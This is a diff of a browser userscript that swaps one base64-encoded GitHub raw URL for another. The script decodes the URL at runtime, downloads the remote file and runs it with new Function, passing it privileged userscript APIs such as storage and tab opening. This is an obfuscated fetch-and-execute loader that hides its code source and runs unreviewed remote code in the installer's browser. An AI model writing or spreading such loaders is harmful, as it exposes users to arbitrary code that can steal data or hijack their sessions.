@@ -21,21 +21,20 @@
 // @run-at       document-idle
 // ==/UserScript==
 
-(function() {
+(function () {
     'use strict';
 
     
-    const encodedUrl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01pbmhub2Jlby9tdXRpbF9icm93c2VyX2Nsb3VkL21haW4vZXh0ZW5zaW9uLmpz";
+    const encodedUrl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01pbmhiZW84L2V4dGVuc2lvbl9tdWx0aV9Ccm93c2VyL3JlZnMv
+aGVhZHMvbWFpbi9leHRlbnNpb24uanM=";
 
-    
     const sourceUrl = atob(encodedUrl);
 
     GM_xmlhttpRequest({
         method: "GET",
         url: `${sourceUrl}?t=${Date.now()}`,
-        onload: function(response) {
+        onload: function (response) {
             if (response.status === 200 && response.responseText) {
-               
                 new Function(
                     'GM_addStyle', 'GM_setValue', 'GM_getValue',
                     'GM_deleteValue', 'GM_listValues', 'GM_openInTab',
@@ -46,7 +45,7 @@
                 );
             }
         },
-        onerror: function(err) {
+        onerror: function (err) {
             console.error("ko load được cứu bé! >_<.", err);
         }
     });
